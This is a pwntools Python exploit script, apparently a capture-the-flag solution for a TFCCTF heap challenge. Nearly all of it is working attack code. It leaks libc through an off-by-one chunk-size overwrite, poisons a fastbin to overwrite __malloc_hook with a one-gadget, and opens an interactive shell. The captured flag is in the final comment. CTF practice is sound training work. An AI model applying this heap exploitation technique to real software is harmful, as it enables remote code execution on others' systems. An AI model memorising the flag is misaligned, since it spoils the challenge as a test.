#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./chall')
context.terminal = ['tmux', 'splitw', '-hp', '70']
libc = elf.libc #no tcache libc

index = 0

def start():
    if args.GDB:
        return gdb.debug('./chall', gdbscript=gs)
    if args.REMOTE:
        return remote('challs.tfcctf.com', 30500)
    else:
        return process('./chall')
r = start()


def save_pass(size, creds, name):
    global index
    r.sendline(b"1")
    r.sendlineafter(b"length:", str(size).encode('ascii'))
    r.sendafter(b"credentials:", creds)
    r.sendafter(b"the credentials:", name)
    r.recvuntil(b"Input:")
    index += 1
    return index - 1

def delete(idx):
    r.sendline(b"3")
    r.sendlineafter(b"Select index: ", str(idx).encode('ascii'))
    r.recvuntil(b"Input:")


#========= exploit here ===================

a = save_pass(0x68, b"AAAAAAAA", b"aaaaaaaa")
b = save_pass(0x68, b"BBBBBBBB", b"bbbbbbbb")
c = save_pass(0x68, b"CCCCCCCC", b"cccccccc")
d = save_pass(0x68, b"DDDDDDDD", b"dddddddd")
e = save_pass(0x68, b"EEEEEEEE", b"eeeeeeee")

#leaking libc
delete(a)
a = save_pass(0x68, b"A"*0x68+p8(0xe1), b"AA")
delete(b)
#
b = save_pass(0x68, b"dpladpla", b"BB")

#leak
r.sendline(b"2")
r.recvuntil(b"dpladpla")
leak = u64(r.recvuntil(b"2. cccccccc").split(b"2. cccccccc")[0].ljust(8,b"\x00"))
r.recvuntil(b"Input: ")
log.info(f"leak = {hex(leak)}")

libc.address = leak - 0x3b4c90
log.info(f"libc = {hex(libc.address)}")

#exploit
#"reset heap"
save_pass(0x68, p64(0xdeadbeef), b"YY")

#continue
delete(3)
delete(2)
delete(0)
a = save_pass(0x68, b"A"*0x68+p8(0xe1), b"AA")

#overlapped chunks

delete(1) #chunk b
payload = b"\x00"*0x68
payload += p64(0x70)
payload += p64(libc.sym.__malloc_hook-0x23)#fake fast
b = save_pass(0x78, payload, b"AA")

#overwriting malloc hook
c = save_pass(0x68, b"CCCCCCCC", b"CC")
payload = b"A"*0x13

payload += p64(libc.address+0xe1fa1) #one gadget?
hook = save_pass(0x68, payload, b"hook")

#get a shell
r.sendline(b"1")
r.sendlineafter(b"length:", b"24")
#========= interactive ====================
r.interactive()
#TFCCTF{1bfa1610464e9e5d288407a752e2a25645f9a6b1e2594fc4a68f4811da52172d}